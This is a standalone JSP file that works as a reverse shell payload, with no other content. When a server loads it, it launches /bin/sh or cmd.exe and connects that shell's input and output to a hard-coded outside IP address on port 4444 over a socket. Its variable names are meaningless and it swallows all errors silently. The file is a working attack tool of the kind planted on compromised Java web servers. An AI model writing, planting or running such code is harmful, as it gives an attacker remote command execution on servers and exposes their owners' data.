<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream hx;
    OutputStream zd;

    StreamConnector( InputStream hx, OutputStream zd )
    {
      this.hx = hx;
      this.zd = zd;
    }

    public void run()
    {
      BufferedReader lg  = null;
      BufferedWriter jqe = null;
      try
      {
        lg  = new BufferedReader( new InputStreamReader( this.hx ) );
        jqe = new BufferedWriter( new OutputStreamWriter( this.zd ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = lg.read( buffer, 0, buffer.length ) ) > 0 )
        {
          jqe.write( buffer, 0, length );
          jqe.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( lg != null )
          lg.close();
        if( jqe != null )
          jqe.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "107.170.206.239", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
